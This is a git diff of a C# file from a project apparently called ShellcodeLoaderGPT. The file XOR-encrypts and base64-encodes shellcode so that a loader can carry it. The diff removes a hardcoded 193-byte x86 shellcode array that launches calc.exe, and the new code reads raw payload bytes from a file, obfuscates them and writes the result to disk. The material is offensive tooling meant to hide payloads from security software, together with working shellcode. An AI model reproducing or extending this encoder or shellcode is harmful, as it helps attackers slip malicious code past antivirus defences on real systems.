@@ -24,63 +24,48 @@ namespace ShellcodeLoaderGPT
                 encryptedBytes[i] = (byte)(inputBytes[i] ^ keyBytes[i % keyBytes.Length]);
             }
 
-            string hexString = BitConverter.ToString(encryptedBytes);
-
-            string output = $"byte[] byteArray = new byte[] {{ 0x{hexString.Replace("-", ", 0x")} }};";
-
-            // automate this
-            using (StreamWriter sw = new StreamWriter("C:\\Users\\kyria\\Desktop\\github\\ShellcodeLoaderGPT\\Encryptions\\obj\\Debug\\xor.txt"))
-            {
-                sw.WriteLine(output);
-            }
-
             return encryptedBytes;
         }
 
-        static void base64(byte[] inputBytes)
-        {
-            // Encode inputBytes in base64 format
-            string base64String = Convert.ToBase64String(inputBytes);
-
-            // automate this
-            // Output encoded string in base64 format
-            using (StreamWriter sw = new StreamWriter("C:\\Users\\kyria\\Desktop\\github\\ShellcodeLoaderGPT\\Encryptions\\obj\\Debug\\base64.txt"))
-            {
-                sw.WriteLine(base64String);
-            }
-
-        }
-
-
         static void Main(string[] args)
         {
-            // Replace the following placeholder with your shellcode
-            byte[] shellcode = new byte[193] {0xfc,0xe8,0x82,0x00,0x00,0x00,
-                0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,
-                0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
-                0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,
-                0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,
-                0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,
-                0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,
-                0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
-                0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,
-                0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,
-                0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,
-                0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,
-                0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
-                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,
-                0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,
-                0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,0x61,
-                0x6c,0x63,0x2e,0x65,0x78,0x65,0x00};
+            string contents;
+            try
+            {
+                // Read all bytes from the file
+                using (StreamReader reader = new StreamReader("C:\\Users\\kyria\\Desktop\\github\\ShellcodeLoaderGPT\\Encryptions\\payload.txt", Encoding.GetEncoding("UTF-8"), true))
+                {
+                    contents = reader.ReadToEnd();
+                }
 
-            // Xor encryption
-            byte[] output = XOR(shellcode);
+                string[] hexValues = contents.Split(',');
+                byte[] rawcode = new byte[hexValues.Length];
 
-            // Base64 encoding
-            base64(output);
+                for (int i = 0; i < hexValues.Length; i++)
+                {
+                    rawcode[i] = Convert.ToByte(hexValues[i], 16);
+                }            
+                
+                // Xor encryption
+                byte[] output = XOR(rawcode);
 
+                // Base64 encoding
+                string bxoredstring = Convert.ToBase64String(output);
 
-
+                // Write the output in the output.txt
+                using (StreamWriter sw = new StreamWriter("C:\\Users\\kyria\\Desktop\\base64.txt"))
+                {
+                    sw.WriteLine(bxoredstring);
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("Exception: " + e.Message);
+            }
+            finally
+            {
+                Console.WriteLine("Process completed");
+            }
         }
     }
 }
